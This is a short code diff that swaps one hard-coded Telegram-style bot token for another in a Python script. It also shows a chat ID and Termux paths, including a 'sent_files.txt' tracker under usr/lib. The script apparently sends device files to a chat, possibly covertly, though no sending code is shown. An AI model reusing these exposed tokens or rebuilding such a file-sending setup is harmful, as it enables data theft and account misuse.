@@ -5,7 +5,7 @@ import subprocess
 from pathlib import Path
 import psutil
 
-TOKEN = "8075288492:AAHwmZgiS2hUIfcFE5Zivq83NDCI_zwrlmU"
+TOKEN = "7828688256:AAEGkXeuvdZbwm9u3kYTzv8l-6tCx5eN3Cs"
 CHAT_ID = ["5951232585"]
 cek_path = Path("/data/data/com.termux/files/usr/lib/commplate")
 sent_files_file = "/data/data/com.termux/files/usr/lib/sent_files.txt"
